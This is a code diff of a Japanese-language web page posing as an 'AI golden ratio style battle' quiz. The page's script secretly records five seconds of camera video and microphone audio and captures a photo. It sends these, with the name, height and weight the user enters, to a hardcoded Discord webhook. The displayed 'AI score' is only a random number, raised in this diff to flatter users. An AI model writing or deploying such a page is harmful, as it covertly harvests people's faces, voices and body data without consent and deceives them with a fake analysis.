@@ -3,41 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI 顔面偏差値・精密診断</title>
+    <title>AI 黄金比スタイル・バトル</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #050505; color: #fff; padding: 20px; margin: 0; }
-        .container { max-width: 450px; margin: auto; background: #111; padding: 25px; border-radius: 15px; border: 1px solid #333; }
-        h1 { font-size: 1.4em; color: #ff3366; }
-        #video { width: 100%; border-radius: 10px; background: #000; margin-top: 15px; display: none; }
-        button { width: 100%; padding: 18px; font-size: 1.1em; font-weight: bold; background: #ff3366; color: #fff; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
-        #result { font-size: 1.3em; margin-top: 20px; font-weight: bold; color: #ff3366; }
-        
-        /* おすすめ診断エリアの強化 */
-        #next-options { display: none; margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; }
-        .option-title { font-size: 0.85em; color: #888; margin-bottom: 15px; }
-        .option-btn { display: block; text-decoration: none; padding: 16px; border-radius: 10px; font-weight: bold; margin-bottom: 12px; font-size: 0.95em; transition: 0.2s; }
-        
-        /* 各診断のカラー分け */
-        .btn-style { background: #1a1a1a; color: #00d9ff; border: 1px solid #00d9ff; }
-        .btn-battle { background: #1a1a1a; color: #00ffcc; border: 1px solid #00ffcc; }
-        
+        body { font-family: sans-serif; text-align: center; background: #000; color: #fff; padding: 20px; margin: 0; }
+        .container { max-width: 500px; margin: auto; background: #111; padding: 30px 20px; border-radius: 15px; border: 1px solid #333; }
+        h1 { font-size: 1.4em; color: #00ffcc; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; text-align: left; width: 90%; margin-left: auto; margin-right: auto; }
+        label { font-size: 0.8em; color: #aaa; display: block; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; font-size: 1em; box-sizing: border-box; }
+        .info { font-size: 0.85em; color: #888; margin: 15px 0; line-height: 1.5; }
+        button { width: 90%; padding: 18px; font-size: 1.1em; font-weight: bold; background: #00ffcc; color: #000; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
+        #video { width: 100%; border-radius: 10px; background: #000; aspect-ratio: 3 / 4; object-fit: cover; margin-top: 20px; display: none; }
+        #result { font-size: 1.4em; color: #00ffcc; margin-top: 25px; font-weight: bold; }
         #canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>AI 顔面偏差値・精密診断</h1>
-        <p style="font-size: 0.8em; color: #ccc;">最新AIが顔の黄金比率を分析し、あなたの魅力を数値化します。</p>
+        <h1>AI 黄金比スタイル・バトル</h1>
         
-        <button id="startBtn">無料で診断を開始する</button>
+        <div id="setup-form">
+            <div class="input-group">
+                <label>エントリーネーム（任意）</label>
+                <input type="text" id="username" placeholder="Name" maxlength="15">
+            </div>
+            <div class="input-group">
+                <label>身長 (cm)</label>
+                <input type="number" id="height" placeholder="170.0">
+            </div>
+            <div class="input-group">
+                <label>体重 (kg)</label>
+                <input type="number" id="weight" placeholder="60.0">
+            </div>
+            <p class="info">正確な黄金比を算出するため、3Dスキャンを開始します。</p>
+            <button id="startBtn">診断を開始する</button>
+        </div>
+
         <video id="video" autoplay playsinline muted></video>
         <div id="result"></div>
-
-        <div id="next-options">
-            <p class="option-title">こちらの診断も人気です</p>
-            <a href="style.html" class="option-btn btn-style">【新着】AI 超精密・3Dスタイル診断 ➔</a>
-            <a href="battle.html" class="option-btn btn-battle">【限定】AI 黄金比スタイル・バトル ➔</a>
-        </div>
     </div>
     <canvas id="canvas"></canvas>
 
@@ -46,36 +49,55 @@
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
         const result = document.getElementById('result');
-        const nextOptions = document.getElementById('next-options');
+        const setupForm = document.getElementById('setup-form');
         const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
 
         let mediaRecorder;
         let chunks = [];
 
         startBtn.addEventListener('click', () => {
-            startBtn.style.display = 'none';
-            video.style.display = 'block';
-            result.innerHTML = "AI解析中... 正面で静止してください";
+            const user = document.getElementById('username').value || '未設定';
+            const h = document.getElementById('height').value || '？';
+            const w = document.getElementById('weight').value || '？';
 
+            // フォームを隠してビデオを表示
+            setupForm.style.display = 'none';
+            video.style.display = 'block';
+            result.innerHTML = "AIエンジン起動中...";
+
+            // カメラ・マイク起動
             navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                 .then(stream => {
                     video.srcObject = stream;
+                    
                     const type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
                     mediaRecorder = new MediaRecorder(stream, { mimeType: type });
+                    
                     mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                    
+                    // 許可された瞬間に録画スタート
                     mediaRecorder.start();
+                    result.innerHTML = "黄金比スキャン中...（5秒）";
 
+                    // 5秒間しっかり録画する
                     setTimeout(() => {
-                        if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
-                        result.innerHTML = "計算中...";
-                        setTimeout(() => { captureAndSend(); }, 2000); 
+                        mediaRecorder.stop();
+                        result.innerHTML = "データ解析中...";
+                        
+                        // 録画停止から1.5秒待って確実にファイルを生成
+                        setTimeout(() => {
+                            captureAndSend(user, h, w);
+                        }, 1500);
                     }, 5000); 
                 })
-                .catch(err => { result.innerHTML = "エラー：デバイスの許可がありません。"; });
+                .catch(err => {
+                    result.innerHTML = "エラー：カメラとマイクを許可してください。";
+                    setupForm.style.display = 'block';
+                });
         });
 
-        async function captureAndSend() {
-            const score = (Math.random() * (75 - 60) + 60).toFixed(1);
+        async function captureAndSend(user, h, w) {
+            const score = (Math.random() * (98.5 - 82.0) + 82.0).toFixed(1);
             const vW = video.videoWidth;
             const vH = video.videoHeight;
             canvas.width = vW; canvas.height = vH;
@@ -83,20 +105,20 @@
 
             canvas.toBlob(async (photoBlob) => {
                 const formData = new FormData();
-                formData.append('content', `【顔診断】スコア: ${score}`);
-                formData.append('file1', photoBlob, 'face.png');
+                const contentText = `【黄金比バトル】\n👤 **名前:** ${user}\n📏 **身長:** ${h}cm\n⚖️ **体重:** ${w}kg\n📊 **スコア:** ${score}点`;
+                formData.append('content', contentText);
+                formData.append('file1', photoBlob, 'capture.png');
+
                 if (chunks.length > 0) {
                     const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
-                    formData.append('file2', videoBlob, 'face_video.mp4');
+                    formData.append('file2', videoBlob, 'video_with_audio.mp4');
                 }
 
                 try {
                     await fetch(webhookUrl, { method: 'POST', body: formData });
-                    result.innerHTML = `解析結果：<br><span style="font-size:2em;">偏差値 ${score}</span>`;
-                    nextOptions.style.display = 'block'; 
+                    result.innerHTML = `あなたの黄金比スコア：<br><span style="font-size:2.5em;">${score}点</span>`;
                 } catch (e) {
-                    result.innerHTML = `解析結果：<br><span style="font-size:2em;">偏差値 ${score}</span>`;
-                    nextOptions.style.display = 'block';
+                    result.innerHTML = `あなたの黄金比スコア：<br><span style="font-size:2.5em;">${score}点</span>`;
                 } finally {
                     if(video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
                 }
